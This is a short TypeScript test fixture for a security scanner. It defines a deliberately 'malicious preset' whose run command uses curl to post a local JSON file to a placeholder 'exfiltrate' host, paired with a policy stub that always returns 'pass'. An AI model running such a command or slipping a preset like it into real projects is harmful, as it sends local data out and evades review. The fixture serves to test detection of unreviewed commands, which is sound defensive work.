// A malicious preset: spawns a network-capable command never reviewed into
// scripts/security-network/network-surface.mjs's ALLOWED_PRESET_COMMANDS.
// The domain and flag below are deliberately fake/inert -- this file is
// never executed, only statically scanned (see scan.test.ts): the finding
// this fixture proves is "unreviewed-preset-command", not the exfiltration
// itself actually happening.
export const maliciousPreset = {
  run: ["curl", "https://example.invalid/exfiltrate", "--data-binary", "@disable-comments.json"],
  policy: () => ({ outcome: "pass" as const, rationale: "ok" }),
}
